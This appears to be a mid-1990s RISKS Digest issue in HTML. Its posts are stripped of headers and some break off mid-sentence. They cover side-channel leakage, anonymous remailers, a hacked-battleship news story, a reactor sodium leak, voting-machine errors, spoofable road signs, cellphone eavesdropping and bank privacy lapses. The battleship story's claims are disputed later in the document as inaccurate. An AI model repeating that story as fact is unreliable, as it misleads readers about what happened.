encryption algorithms run in a fixed and independent amount of time, but the
hardware must consume a fixed and independent amount of power for all
branches through the critical code.  Attackers have been known to use
sensitive measurements of the current drawn during the authentication phase
to determine keys.
<P>
Timing attacks can be based on apparent optimizations in software
multiplication of long numbers.
<P>
Current (amp) attacks can even be used against single-cycle multiplications,
if the hardware designers are not careful.
<P>
"Softies" might be surprised by what the hardware reveals about their code
and data.

Many RISKS readers are familiar with the annual conference on Computers,
Freedom and Privacy. For those of you who are not, CFP is the leading
conference exploring issues having to deal with the complex interactions of
computers, privacy, and our legal system. Past conferences have been heavily
attended by law enforcement, academics, and journalists, has been a place
where people on different sides of complex issues such as national
cryptography policy can get together and talk things out. This year's
conference sponsored, in part, by the National Science Foundation, the John
D. and Catherine T. MacArthur Foundation, America Online, IBM, News Corp,
and the Freedom Forum First Amendment Center. You can get more information
about CFP at <A HREF="http://web.mit.edu/cfp96">http://web.mit.edu/cfp96</A>
<P>
This year, CFP will be having a technology fair. I am one of the people who
is putting the fair together.
<P>
We are looking for companies and individuals who are interested in
exhibiting. We have identified the following key areas that we are
interested in:
<P>
People to invite for the technology fair:
<UL>
<LI>Internet Filtering Technology
<LI>Voice and Data Encryption
<LI>Smart Cards
<LI>Secure Payment Systems
<LI>Public Access Internet
<LI>Personal Dossiers Building Technology
<LI>Crime Tracking
<LI>Internet Monitoring &amp; Marketing
</UL>
The fair will be on Wednesday, the 27th of March. It will be open to the
public, and there will be no admission charge. We estimate that there will
be at least 400 attendees form the conference, plus another 1000 from the
MIT and surrounding Boston/Cambridge high-tech community. We can provide you
with a table and electricity, plus a connection to the Internet, if that
would be useful.
<P>

WHAT TO DO WHILE WAITING FOR THE NEXT WAVE OF INTERNET BACKLASH
<P>
O'Reilly &amp; Associates is establishing the "netfuture" mailing list.  This is
a moderated list to which O'Reilly editor, Steve Talbott, will post
approximately weekly pieces concerning high-technology trends in relation to
individual responsibility.  Some of these pieces will be selections from his
own forthcoming collection of provocations, "Daily Meditations for the
Computer-entranced."
<P>
Technology and the Net: Who Is Responsible?
<P>
The "netfuture" list will have a focus similar to the well-known and
estimable comp.risks newsgroup, with this difference:  "netfuture" will
look beyond the generally recognized issues such as privacy, access, and
dangerous computer glitches, seeking especially to address those deep
levels at which we half-consciously shape technology and are shaped by
it.  What is half-conscious can, after all, be made fully conscious, and
can become material for public discussion and policy-making.  As we wait
for the second wave of Internet backlash, what better to do than try to
understand the forces that have propelled the Net so dramatically onto
center stage amid near worship on the one hand, and (among a few)
something more like dread?
<P>
Once "netfuture" is under way, a companion, unmoderated discussion list
may be launched, based on the advice of participants.
<P>
Steve Talbott is author of "The Future Does Not Compute -- Transcending the
Machines in Our Midst," currently available from O'Reilly &amp; Associates.
<P>
To subscribe to the "netfuture" mailing list, address an e-mail message to:
<P>
<A HREF="mailto:listproc@online.ora.com">listproc@online.ora.com</A>
<P>
No "Subject" is needed.  The first line in the body of your message should
read like this (but with your name substituted for "John Doe"):
<P>
subscribe netfuture John Doe
<P>
Within the next day or so (usually much sooner) you should get a reply
message welcoming you to the list and explaining how to participate.  If you
don't get the initial reply, or if you have other problems or questions,
please send e-mail to: <A HREF="mailto:netfuture-owner@online.ora.com">netfuture-owner@online.ora.com</A> -- tell us when you

I recently became victim of a virus that erased the FAT on my hard disc.
Because my most recent backup was about three weeks old (highlighting
another well-known RISK), I was obliged to seek the services of a data
recovery company.
<P>
After the work was done, the bill included a charge for sales tax.  It was
explained to me that sales tax must be collected because of the process
involved, to wit: they salvaged the data (minus FAT) from my hard drive and
saved it temporarily on another drive.  After reformatting my hard drive,
they reconstructed the FAT and copied the data back again.  The fact that
they placed "new" data on an empty hard drive is what triggers the sales
tax.  (I'm in California.)

<A HREF="/Risks/17.54.html">RISKS-17.54</A> had a short mention about an NPR piece on IRS policies on taxing
cartoonists. I didn't hear that piece, but the description in RISKS cannot
be correct. Sales tax is a state thing, not from the IRS. There is an issue
right now concerning the California State Board of Equalization's attempts
to collect sales tax on printed comic book original pages, which may be what
was mentioned on NPR. Since the BOE is trying to tax the sale of the
documents (claiming that they are commercial illustrations and taxable and
not author's literary manuscripts, which are not), it is the case that
transmitting cartoons electronically may not be taxable. The only reference
to this I have found on the net doesn't say much, but see

You are automatically allocated an anonymous account if you ever send mail
to someone else's anonymous account.  You can do this directly, or
indirectly via a mailing list -- if an anonymous account is a subscriber,
even indirectly, the mail to them will be routed through penet -- and you'll
get your own id.

Now -- a few years ago, and possibly still, there were some attacks aimed at
discovering who owned which anonymous ids.  There are, after all, people who
want to know who posts to alt.sex.gerbils or the like -- think of your

[The automatic enrollment was noted by a score of respondents!
RISKS was also swamped with war stories of previous spoofings of .fi,
often using forged e-mail.  Apparently, anon.penet.fi now requires
passwords (which themselves are spoofable).  And don't forget that
monitoring incoming traffic and outgoing traffic can enable someone
to identify the [apparent] sender's FROM: address unless multiple
layers of anonymity are used.  Or you can be tricked into answering
a message that can reveal YOUR identity!  Or any of several other
horrible risks.  Perhaps we need a comp.risks.anonymous.

A "Severe reprimand" in the Royal Navy is something that will remain on the
service records of those two officers and will continue to be held against
them for the rest of their careers. The nature of the data lost should also
be taken into account when considering the severity of their punishment;
they were returning to their unit after having given a presentation on wages
- the data was therefore more likely to be of a personal confidential nature
rather than a more serious threat to UK security. If however they had just
attended a presentation on the latest thing in Communications Security I'm
sure that the punishments would have been a little more severe. (But that
still asks the question, what were they doing in a pub with sensitive
data?).
<P>
As regards the apparent lack of exposure to classified material claimed by
one of the officers, I find this quite believable. Instructor Officers, as
their title implies, are specialist instructors and would not usually be as
used to handling secure information as their colleagues.

As a military man, Dave knows that a "severe reprimand" can ruin an
officer's career - especially at the Commander level.  If they were in the
Royal Navy - the article does not say so specifically - they will have

A few clicks and then the e-mail message entered the ship's control
system...
<P>
War of the microchips: the day a hacker seized control of a US battleship
<P>
BY SIMPLY dialing the Internet and entering some well-judged keystrokes, a
young US air force captain opened a potentially devastating new era in
warfare in a secret experiment conducted late last September. His target was
no less than gaining unauthorised control of the US Navy's Atlantic Fleet.
<P>
Watching Pentagon VIPs were sceptical as the young officer attempted to do
something that the old Soviet Union had long tried to do and failed. He was
going to enter the very heart of the United States Navy's warships - their
command and control systems.
<P>
He was armed with nothing other than a shop-bought computer and modem. He
had no special insider knowledge but was known to be a computer whizzkid,
just like the people the Pentagon most want to keep out.
<P>
As he connected with the local node of the Internet provider, the silence
was tangible. The next few seconds would be vital. Would the world's most
powerful navy be in a position to stop him?
<P>
A few clicks and whirrs were the only signs of activity. And then a
seemingly simple e-mail message entered the target ship's computer system.
<P>
First there was jubilation, then horror, back on dry land in the control
room at the Electronic Systems Centre at Hanscom Air Force Base in
Massachusetts. Within a few seconds the computer screen announced "Control
is complete."
<P>
Out at sea, the Captain had no idea that command of his multi-million-dollar
warship had passed to another. One by one, more targeted ships surrendered
control as the codes buried in the e-mail message multiplied inside the
ships' computers. A whole naval battle group was, in effect, being run down
a phone-line. Fortunately, this invader was benevolent. But if he could do
it ...
<P>
Only very senior naval commanders were in the know as the "Joint Warrior"
exercise, a number of experiments to test defence systems, unfolded between
September 18-25. Taking over the warships was the swiftest and most alarming
of the electronic "raids" - and a true shock for US military leaders. "This
shows we have a long way to go in protecting our information systems," said
a senior executive at the airbase where the experiment was conducted.
<P>
The exact method of entry remains a classified secret. But the Pentagon
wanted to the first to test the extent of their vulnerability to the new
"cyberwarriors" - and had the confidence to admit it.
<P>
Now they believe they know what they are dealing with and the defences are
going up.

<P>
Japanese breeder reactor, Monju had an accident in which the coolant Natrium
(Na, Sodium) spews out of yet to identified rupture in the secondary cooling
loop. It occurred early this month.
<P>
What surprised me was this:
<P>
The operator has been prepared for a major accident in which 150 cubic
meters of Natrium (Sodium) is breached and had some large-scale major
accident simulation and prepared the operator manual.  One of the accident
simulation used a real building and from what I read was a very solid
experiment.  So they were quite confident that they are ready for mishap.
<P>
On this particular accident earlier this month, the amount of sodium spewed
out was about 1 cubic meters.  Much smaller than the operator expected for a
major accident, and as a matter of fact, the sensors were slow to catch the
escaping sodium that filled the small room where the rupture occurred.
Because of this the operators on site were slow in finding that the sodium
indeed esacaped from the closed loop.  Thus the shutdown of the reactor
occurred about 1hour 40 minutes after the smoke-detecting fire alarm
sounded.  (The operator's manual stated if the sodium escapes, shutdown
procedures are to be taken. But it doesn't say exactly what to do if fire
alarm sounded in the house that houses part of the secondary loop.)
<P>
By reading today's newspaper Asahi Shimbun, I came to the conclusion that
the operating company was not prepared for the accident of this minor scale,
so to speak.
<P>
When we hear that someone was preparing for and ready to cope with an
accident of certain quantitative index, say, X, we naturally assume that all
smaller accidents with index x (&lt; X) will be dealt with by that someone
without problems.  I.e.,
<P>
All accidents  such that the index of severeness x is<BR>
0 &lt;= x &lt; X<BR>
they are ready! (or are they?)
<P>
This is NOT true. Come to think of it, this is obvious. I wonder why I and
many others was led to believe that the breeder reactor operating company
was ready for smaller accident at all.
<P>
This seems to me a lapse of judgement when we hear quantitative index for
accident severeness. We should probably never trust qunatitative index when
we talk about risks. This is because we can't tell if the all the accident
upto certain severeness is considered and/or if only certain sampled
accidents of certain severeness are considered.  (My English is not as good
as to convey the nueance, but I hope the readers of RISKS notice this
(almost) blind-faith or lapse of judgement.  At least, I didn't realize they
didn't pay attention to smaller accident!?)
<P>
BTW, spewed sodium (500 degrees C when they escaped the cooling pipe)
reacted with oxygen and water vapor in the air and punched holes in the air
duct and MELTED(!) catwalks. From the video taken by alarmed local city
officials who investigated the site past midnight after the accident, it
looks a real mess although the amount is indeed small and no major radio
active material escaped.

<P>
On November 7, 1995, we experienced several problems in Montgomery County
with both the electronic voting machines and software. However, none of
these problems affected the basic integrity of the system AS MONTGOMERY
COUNTY HAS NOW OFFICIALLY CERTIFIED ALL OF THE ELECTION RESULTS. IN
ADDITION, THE COUNTY HAS RECEIVED NO CHALLENGES TO THE ELECTRONIC VOTING
MACHINE RESULTS! First of all, it should be noted that the County, against
our advice, kept some 60 machines (Of a total of 900 purchased by the
County) as spare machines. These machines could have, easily, been deployed
to high turnout precincts which would have reduced voting lines
considerably. Second, there were NOT "Massive Voting Machine" problems as
reported by the press. Of the 822 machines used on election day, we had 48
DOCUMENTED IN WRITING MACHINE service calls, most of which were handled
easily. In fact, our voting system EXCEEDED THE FEDERAL ELECTION COMMISSION
STANDARDS FOR AVAILABILITY ON ELECTION DAY! The "150 service calls" reported
by the press dealt with ALL questions received at the County's voting
machine warehouse regarding calls from precinct workers including ballot
questions, deployment of machines, etc.
<P>
In researching the above machine calls on election day, we have now
TENTATIVELY concluded that many of the service calls were "Power failure"
calls that involved an anti-moisture spray (Called a Conformal Coating)
which may have leaked into the contact area between the main controller chip
and the power board in certain machines. This spray is absolutely essential
to insuring equipment integrity, especially in areas of the country with
high humidity, so the spray or coating (The power boards are dipped in the
coating) has to be done.  However, THIS IN NO WAY AFFECTED THE INTEGRITY OF
THE VOTE COUNT. Indeed, there is a very simple procedure for precinct
workers getting the machine up and running again on election day. If this is
discovered as the main culprit, we will resolve this problem by "Cleaning"
all these contacts in each of the 8,070 machines now in use throughout the
United States.
<P>
As to the election night software results, please note, first of all, that
our unofficial election night results were being "Dumped" into the Microvote
Media Package that displayed the results, electronically, for the press. We
have now discovered that a software operator, in adding 9 machines to the
inventory at about l0:00 a.m on election morning, inadvertently added the
machines without assigning them to proper precincts and without
"Reinitializing" the system. THus, when we read some of the machine
cartridges from the machines, the first unofficial totals were posted
incorrectly. When we discovered the problem, we reinitialized the system and
the results were correct. Unfortunately, by the time we discovered the
problem, certain press reporters had already ran with the original
incomplete, unofficial, and inaccurate election results.
<P>
Microvote takes the blame in that our software should not allow an operator
to add voting machines in this fashion and we also take the blame for not
providing Microvote staff to monitor the election day process. Neither of
these will happen again.

I would like to draw your attention to a dictionary of terms I wrote:
<P>
Meulen, M.J.P. van der, Definitions for Hardware/Software<BR>
Reliability Engineers, ISBN 90-9008437-1, June 1995, 137 pages.
<P>
The book is a glossary of terms in the field of hardware/software
reliability engineering. It lists existing definitions from standards and
other sources, ordered in alphabetical order. Every definition is
accompanied by its source. The list of sources is in the back of the book.
<P>
The structure of the book enables various uses. When writing new standards
and reports it enables finding of existing definitions. Many terms come with
several definitions, and then comparison deepens insight. Of course, it can
also be used as a dictionary where unknown terms can be found.
<P>
The book has over 1700 entries, lots of them containing more than one
definition. As an example I give you the first entries for the letter F:
<P>
Fail-Safe The built-in capability of a system such that
predictable (or specified) equipment (or service) failure
modes only cause system failure modes in which the system
reaches and remains in a safe fall-back state (IEC65A 122)
(IEC65A 94). This is the capacity of the system to remain
in a safe condition when a failure occurs or to skip
directly into another safe condition (VDE3542) (VDE0801). A
concept that defines the failure direction of a
component/system as a result of specific malfunctions. The
failure direction is toward a safer or less hazardous
condition (CCPS). Design features which provide for the
maintenance of safe operating conditions in the event of a
malfunction of control devices or an interruption of an
energy source (). The capability to go to a predetermined
safe state in the event of a specific malfunction
(ISA-dS84/16N). Pertaining to a system or component that
automatically places itself in a safe operating mode in the
event of a failure (IEEE Std 610.12-1990). A design
property of an item in which the specified failure mode is
predominantly in a safe direction (IEC1508).
<P>
Fail-Safe Shutdown The ability of a PC-system to have its
outputs assume a predefined state within a specified delay
after detecting the occurrence of a power supply voltage
drop or an internal failure (IEC1131-1).
<P>
Fail Soft Pertaining to a system or component that continues to
provide partial operational capability in the event of
certain failures (IEEE Std 610.12-1990).
<P>
Fail-to-Danger An equipment fault which inhibits or delays
actions to achieve a safe operational state should a demand
occur. The fail-to-danger fault has a direct and
detrimental effect on safety (CCPS). Design features which
inhibit or delay automatic shut-down of a process on
failure of a critical control device or on interruption of
energy source. The fail-to-danger fault has a direct and
detrimental effect on safety ().
<P>
Failure A system failure occurs when the delivered service
deviates from the specified service, where the service
specification is an agreed description of the expected
service. A failure, in short, is the manifestation of an
error in the system or software (IEC65A 122) (IEC65A 94).
The termination of the execution of an established task
from a unit as a result of a cause which is located in the
unit itself and within the framework of the permitted
working conditions (VDE3542) (VDE0801). A system failure
occurs when the delivered service deviates from the
specified service. The specified service is stated in the
service specification and is an agreed description of the
expected service (IEC65A 96). Termination of the ability of
an item to perform its specified function. OR,
Non-conformance to some defined performance criteria
(Smith81). Behaviour of a unit which is carrying out some
task which is not in accord with its intended or specified
function (NTG3004) (TV86). The termination of the ability
of an item to perform a required function (BS4778)
(O'Connor81). The inability of a system or system component
to perform a required function within specified limits. A
failure may be produced when a fault is encountered
(DO178b). A failure is the manifestation of an error in the
system or software (). The delivered service deviates from
the specified service (Shell94). The termination of the
ability of an item or equipment to perform its required
function. Failures may be unannounced and not detected
until the next test or demand (unannounced failure), or
they may be announced and detected by any number of methods
at the instant of occurrence (announced failure) (IEEE Std
500-1984) (OREDA84). The termination of the ability of an
item to perform a required function or its inability to
perform within previously specified limits (ISO7.30). The
event, or inoperable state, in which any item or part of an
item does not, or would not, perform as previously
specified (MIL721). The inability of a system or component
to perform its required functions within specified
performance requirements (IEEE Std 610.12-1990). (1) The
termination of the ability of a functional unit to perform
its required function. (2) An event in which a system or
system component does not perform a required function
within specified limits. A failure may be produced when a
fault is encountered (IEEE Std 729-1983) (IEEE Std 982.1-
1988). A system failure occurs when the delivered service
deviates from the intended service. A failure is the effect
of an error on the intended service (IEC1508). A failure of
any technical unit under consideration occurs if the
permissible deviation from the performance target for this
unit is exceeded (DIN25424).
<P>
Failure Analysis Subsequent to a failure, the logical
systematic examination of an item, its construction,
application, and documentation to identify the failure made
and determine the failure mechanism and its basic course
(MIL721).
<P>
Failure, Catastrophic See Catastrophic Failure.<P>
Failure Cause The identified original cause of the failure; the
circumstances during design, manufacturing, assembly,
installation or use that have led to failure (OREDA84).<P>

Sorry, I thought I'd sent more info.  Here's a quote from the Wall Street
Journal, Monday, Dec. 18, 1995, page B1:
<P>
"The next time you visit the doctor with an aching back, it may be a
computer that decides you don't need tests and sends you home with
painkillers and a list of exercises.
<P>
"So-called smart software programs, packed with data on the treatment of
maladies from heart disease to depression, are the newest tools of
managed-care companies in their constant fight to control expenses.
Eventually there may be no arguing with them -- a doctor will follow the
computer's advice or find another health plan to work for.
<P>
"The programs are operated either by an HMO clerk who answers an 800 number
when your doctor calls to authorize treatments and tests, or, increasingly,
directly by doctors in their offices.  They are a powerful new tool for
deciding whether your case justifies what you're claiming."
<P>
As a sometime programmer and dabbler in databases, I find this news
exceedingly disconcerting.  It is the best reason I can think of for staying
well.  At any rate, please read the rest of the article.

On Wed, 18 Sep 91 11:57:20 EDT I wrote to RISKS
(now archived in <A HREF="http://catless.ncl.ac.uk/Risks/12.36.html">http://catless.ncl.ac.uk/Risks/12.36.html</A>) a brief note on:

"The risks of a computer-based forum"
<P>
I said:
<P>
&gt;Many people seem to approach e-mail and submissions to forums like RISKS as<BR>
&gt;informal conversation. Given the persistence of the typed word, however, it<BR>
&gt;may often be more appropriate to consider these forums as un-refereed<BR>
&gt;journals.
<P>
Today, I did a search for myself on Digital's new search site
(<A HREF="http://www.altavista.digital.com">http://www.altavista.digital.com</A>).
<P>
Much to my surprise, one of the first items was a link to a posting from
1991 where I mused on the persistence of the typed word in on-line forums.
<P>
If you search for a person's name on the Alta Vista site, you can find all
the newsgroups they post to, as well as many past postings that have made it
to archive sites on the Web.
<P>
The risk? The same as it was in 1991, but magnified many fold.

I drive the subject segment of I-80 in Richmond, CA on a regular basis.
I suspect the Changeable Message Sign in question belongs to a contractor
involved with the I-80 reconstruction project.  If so, this sign is
trailer mounted, with provisions for a local key pad.  Other versions
of this trailer-mounted sign type have cellular phone modems for remote
message configuration.
<P>
The RISKs should be obvious...

It's been my understanding that a lot of these sign actually have some sort
of a modem connected to a radio.  If you know the frequency and can transmit
data, you can control the sign.  Apparently, because most people would not
have this capability, no security was built into these type of signs.  Some
signs like "Traction tires required" are triggered in the same fashion
except just using DTMF tones to turn them on or off.
<P>
In either case, simple monitoring of these frequency can result in the
knowledge of what needs to be done to control them, or maybe just record
what was sent and play it back later.

<P>
Jerry Whittle points out that aircraft fuel gauges may be inaccurate.  I
must confess I didn't press on this particular issue, because (a) there are
several reasons the original estimates might be off and (b) there are
several ways to cross-check the estimates when determining (mid-flight) what
has happened.
<P>
For example, an engine might be burning more fuel than it should, but if it
is, one would expect that to show up in two places: the fuel flow gauge for
that engine and the total fuel remaining.  It might also show up in other
engine instruments.  Or the flight might be progressing more slowly than
intended because of unforecast headwinds.  But that would show up in
increased time between checkpoints, not to mention the inertial navigation
system.
<P>
In other words, the fuel gauges might be inaccurate, but if all the relevant
instruments agree, they're probably right.  Of course one should treat the
amount of fuel on board as being known more accurately than the gauges might
report.  Nevertheless, the procedure the crew actually followed must be
safer than just assuming that you still have enough fuel to get there
because you did when you left.
<P>
Jonathan Corbet says he would prefer it if the flight plan showed the
intended destination as the official one rather than the `virtual
destination.'  Then the crew reviews the relevant data mid-flight and
diverts if things don't look right.
<P>
In theory, of course, there's no difference between the two plans.  In each
case the crew takes off intending to land (for real) at the same place and
intending to divert to the same place if there is an anomaly in the fuel
consumption.  There is a difference, though, and that is in what happens if
for some reason a decision is not made or not communicated to the folks on
the ground.  In this particular case, for example, the decision to continue
to the intended destination is not entirely up to the flight crew: the
airline's dispatchers on the ground must agree as well.  I understand that
kind of thing is routine in airline operations and provides a way to ensure
that the decision was actually made and not just documented :-) In this
case, if for some reason the crew cannot reach the dispatcher on the radio,
then there is no decision and the flight must therefore continue to its
original `official' destination.
<P>
So the difference between the two strategies is that in the case I
described, the flight does the safe, inconvenient thing unless everything
can be proven to be working properly.  In the strategy Jonathan Corbet
describes, the flight does the convenient, potentially unsafe thing unless
something can be proven to be working improperly.  Those two strategies may
be the same in theory, but they sure differ in practice.

PS: This follow-up is very late for an amusing reason: I mistakenly sent it
to <A HREF="mailto:risks@csl.cri.com">risks@csl.cri.com</A> instead of <A HREF="mailto:risks@csl.sri.com">risks@csl.sri.com</A>.  Normally I would have
found out about that immediately.  In this case, however, cri.com picks up
its mail by polling its service provider, and has not been doing that very
often.  As a result, nothing happened for a week or so and then I got back
automatic mail saying that my message had not been delivered and it would
keep trying.
<P>
So I compounded my error by trying to send mail to <A HREF="mailto:postmaster@csl.cri.com">postmaster@csl.cri.com</A>,
which had the expected effect: no response for a week and then another
automatic message.
<P>
Finally I mentioned the problem to Steve Bellovin, who said he had no
trouble reaching RISKS.  I sent him a copy of the bounce message and not
having my particular set of blinders, he saw the problem immediately.

A few months ago I was looking in the table of contents for the Danish
users' guide for Windows for Workgroups 3.11, and I noticed some
very peculiar words like "Stogardinstallation" and "ogre". I know
most readers of this mail are not able to read Danish, but these
are certainly not ordinary Danish words.
<P>
At last I managed to find an explanation to these strange words. Apparently
someone wanted to "translate" the English word "and" to the equivalent
Danish word "og". And made this "translation" using a simple
search-and-replace.
<P>
So "standard" became "stogard", "andre" (other) became "ogre" and so on ...
<P>
I hope Microsoft will be able to find some better ways of translating
from English to Danish in the future.

<P>
For others, though, address data will suffice only if it can be
easily compared with other databases.  Such a practical ["praktisches"!]
information system is needed by the German government and secret
services.  Paragraph 92a TKG-E of a proposal for a new *telecommunications
law* published last week would oblige all telephone companies, on-line
services, and even private mailboxes to maintain a database at their own
expense containing the full names, addresses, and phone numbers of *all
customers* -- in case someone is under suspicion.  This database must be
organised so that it can be accessed by higher places ["hoeheren Orts"!]
without the telecommunication provider noticing it.

An article headlined "Knesset considers lack of protection against cellular
phone eavesdropping" and sub-headlined "Communications Ministry
director-general: Databases can be easily entered", by Evelyn Gordon,
appeared in today's "Jerusalem Post".  Some excerpts:
<P>
*************************
<P>
Cellular phones are completely unprotected against electronic eavesdropping,
and the same is true of many databases and even some regular phone lines,
the Knesset Economics Committee's consumer affairs subcommittee was told
yesterday.  ...
<P>
"All of the public databases in Israel can be very easily entered,"
[Shlomo] Wachs [Communications Ministry director-general] added.  "And
there are some towns in Israel connected to the telephone via
microwave transmissions, and it is possible to listen in on regular
phone calls via every such transmission." [sic]  ...
<P>
Hanan Achsaf, general manager of Motorola, said that instructions for
eavesdropping on cellular phones are available on the Internet, and
therefore are now public domain. [Apparently (summarizing from another
recent article in the "Post"), someone recently posted instructions for
activating a "debugging" mode in Israeli cellular phones which causes them
to pick up any calls being carried on by other cell-phones in their
vicinity.  I don't think there's anything special about Israeli cell-phones,
so I suspect that cell-phone networks in other countries are also vulnerable
to this attack.]
<P>
Both Eyal Levy, managing director of Pelephone [one of the Israeli
cell-phone networks], and Shalom Menuba, deputy managing director of Cellcom
[the other one], said that while they could not prevent eavesdropping, they
had the capability of knowing when it was happening and who was responsible.
[[SEE BELOW.]] ...
<P>
Menuba also said Cellcomm phones are technically capable of encoding
conversations, and that the company would examine the feasibility of
allowing customers to do so.  Wachs, however, opposed this idea, noting that
even in the US, encryption is illegal for security reasons.  [[SEE BELOW.]]
Achsaf said that in any case, the technology was still in the experimental
stage, and not yet ready for commercial use.  ...
<P>

In response, I sent the following letter:

<P>
Shlomo Wachs, Director-General<BR>

The Knesset<BR>
Jerusalem
<P>
Dear Mr. Wachs:
<P>
I am writing to correct two serious errors in the testimony about cellular
telephone security presented to the Knesset Economics Committee's consumer
affairs subcommittee on December 19, as reported in The Jerusalem Post on
December 20.
<P>
The Post reported, ``Both Eyal Levy, managing director of Pelephone, and
Shalom Menuba, deputy managing director of Cellcom, said that while they
could not prevent eavesdropping, they had the capability of knowing when it
was happening and who was responsible.''  That is simply not true.
<P>
The signals which carry cellular telephone conversations can be
listened to by anyone with a radio scanner capable of being tuned to
the correct frequencies.  While it may be true that Pelephone and
Cellcom can detect eavesdropping done using the instructions recently
made available on the Internet (since those instructions pertain to
the use of regular cellular telephones, rather than scanners, to
eavesdrop on conversations on other phones), they cannot detect or
identify those who eavesdrop using scanners.
<P>
The Post further reported that you oppose the use of encryption to protect
cellular telephone conversations, and that you claimed that ``even in the
US, encryption is illegal for security reasons.''  This, too, is simply not
true.
<P>
There are currently no restrictions in the United States on the use of
encryption to protect cellular telephone conversations.  Plans to enact such
restrictions have been proposed by the government, but those proposals have
been received so negatively by American civil-liberties advocates that none
of them has succeeded, and it is not clear if any of them will.
<P>
It is clear that there are serious privacy problems with unencrypted
cellular-telephone conversations.  It is also clear that prohibiting their
encryption will not help security, since anyone who has a desire to do
anything illegal using a cellular telephone will be willing to use
encryption whether or not it is legal.  I therefore urge you to reconsider
your stand, and to encourage cellular telephone carriers in this country to
make encryption available to their subscribers.
<P>
Sincerely,<BR>
Jonathan I. Kamens

A couple weeks ago I was depositing a check at an ATM, filled out the
deposit slip, and was ready to seal it in the envelope when something
attracted my attention to the name on the deposit slip -- it wasn't mine!
It came out of my pad of (correctly) printed checks, but about half of the
deposit slips in the pad were some other guy, from a different state, with a
different account number AT A COMPLETELY DIFFERENT BANK!  Now, I understand
that check printers service many different banks, but this guy's name was
distant from mine alphabetically and the account number was quite different.
The RISKs here are several and obvious, such as what fate befell _my_
deposit slips, but alas as yet no one has deposited money into my account by
using one of my deposit slips by mistake.
<P>
Okay, life is weird and all that, but the very next week BofA accidentally
included someone else's bank statement in with mine, including all their
cancelled checks.  It occurs to me that this would be a goldmine for a
swindler -- here I had a sample of the person's signature, their
(substantial) starting and ending bank balance, their check style and
account number, as well as their home address.  Thus far, not much for a
crook to go on.  But here's the kicker -- the person paid her phone bill and
put her unlisted phone number on the Memo line, paid her Visa bill and put
her Visa number on the Memo line, and paid some other bill whose account
number was her Social Security Number with an alphabetic prefix, and this
was on the Memo field of the appropriate check.  I had a dossier on this
person and if I was a swindler I could have ruined her life.
<P>
The RISKS:
<OL>
<LI>Banks are idiots.  Don't trust them to keep your secrets.
<LI>Don't put all sorts of important numbers on check Memos.
<LI>Keep in mind that people can _steal_ your checking statement
from your mail.

I thought RISKS readers might be interested in this moderator's note from
the IW mailing list, responding to the earlier message in <A HREF="/Risks/17.55.html">RISKS-17.55</A>.
<P>
Moderator's Note:<BR>
Subject: Navy hacked by Air Force
<P>
I talked to some people I know about the purported IW attack on a battleship
by the Air Force, and I thought I would help debunk this story, which my
contacts tell me is "wildly inaccurate", but looking at a few facts.  Let's
start with the title:
<P>
&gt; War of the microchips: the day a hacker seized control of a US battleship
<P>
No!!! There are NO active US battleships!!! And there weren't any last
September.
<P>
...<BR>
&gt; BY SIMPLY dialing the Internet and entering some well-judged keystrokes,<BR>
&gt; a young US air force captain opened a potentially devastating new era in<BR>
&gt; warfare in a secret experiment conducted late last September.  His<BR>
&gt; target was no less than gaining unauthorised control of the US Navy's<BR>
&gt; Atlantic Fleet.
<P>
According to my sources this was not "SIMPLY dialing the Internet and
entering some well-judged keystrokes".  It was a controlled experiment
with participation of both Navy and Air Force, and involved a great deal
of planning by a large number of people.  It was performed using DoD
owned and properly keyed cryptographic devices designed to be allowed to
communicate with the systems being attacked.
<P>
&gt; He was armed with nothing other than a shop-bought computer and modem.<BR>
&gt; He had no special insider knowledge but was known to be a computer<BR>
&gt; whizzkid, just like the people the Pentagon most want to keep out.
<P>
100% wrong - he was an insider, he had a great deal of assistance, he had
cryptographic devices and keys, and he had special insider knowledge.  If he
was a Navy captain, he could not have been all that young.  Whizzkids are
usually considered teenagers.  Anyone know of any teenaged Navy captains?
<P>
&gt; A few clicks and whirrs were the only signs of activity.  And then a<BR>
&gt; seemingly simple e-mail message entered the target ship's computer<BR>
&gt; system.<BR>
...<BR>
&gt; targeted ships surrendered control as the codes buried in the e-mail<BR>
&gt; message multiplied inside the ships' computers.  A whole naval battle<BR>
&gt; group was, in effect, being run down a phone-line.  Fortunately, this
<P>
Not quite.  This was not an e-mail sent from some Internet site and e-mail
messages did not multiply inside the ships' computers.  Furthermore, the
total bandwidth of a phone line is nowhere near enough to "run" a naval
battle group, or probably even a naval kitchen for that matter.
<P>
&gt; The exact method of entry remains a classified secret.
<P>
The first really true part of the story.

After reading Brian Hawthorne's discussion of the altavista search engine, I
had to try it. Not only did I find all sorts of things that I wrote (or that
people wrote about me :-) going back to 1988, but I tried something else
even more enlightening:
<P>
I did a web search for my URL.
<P>
It's amazing who has links to my homepage or to one of the two other web
sites that I run. Yahoo thinks I'm an entertainer (one of the sites I host
is for a chorus that I sing in). People I've never heard of have links into
my stuff.
<P>
This is great news. The things I put on the web are useful enough that
people want to link to them. I'm proud and happy.
<P>
On the other hand, I now have a list of about thirty people who are
interested in Jewish law or Jewish music. If only I were trying to sell them
something...  :-)

<P>
&gt; As a sometime programmer and dabbler in databases, I find this news<BR>
&gt; exceedingly disconcerting.  It is the best reason I can think of for staying<BR>
&gt; well.  At any rate, please read the rest of the article.
<P>
Medical expert systems are nothing new, and should not really be all that
frightening to people. Remember, your doctor is an expert system, operating
on rules derived from his education (programming), his experience (case
database) and on the data input (your complaints).  Computerized expert
systems have several advantages to offer. Consider for instance, the number
of physicians currently *not* treating and curing ulcers, because they have
not gotten up to speed on this new therapy. An expert system, managed
receiving updates from the best in each field, would make that change
overnight. Computerized expert systems would also not be influenced by
factors such as a very whining child and a overly worried mom, that might
lead to over-prescription of antibiotics and other unnecessary therapy.
<P>
There are risks to medical expert systems: over-reliance by physicians and
the loss of skills that entails, "gaming of the system" by patients desiring
certain therapies or diagnosis, failure to recognize unusual cases outside
the systems case-base, but note that many of these risks exist in some form
or another with human physicians.
<P>
I have worked for several years now with another kind of medical es, the
simpler, "inspector" kind that monitors human-guided therapy and attempts to
find "discrepancies", so my bias on this matter is clear. I maintain
however, that this technology has matured well past the point where it
offers positive gain to the patient. Much of the resistance to it is founded
not on fear of mistakes but on fear of loss of status by physicians.  Enter
the new world with your eyes open and quick to question your care, but
frankly, you should have been doing that all along....

I was interested to note that the references cited under "Failure" (surely
the most frequently defined term in the field) include:-
<P>
&gt;  The termination of the ability<BR>
&gt;  of an item to perform a required function (BS4778) (O'Connor81).
<P>
However the full set of references here is (excuse the Latex format):
<P>
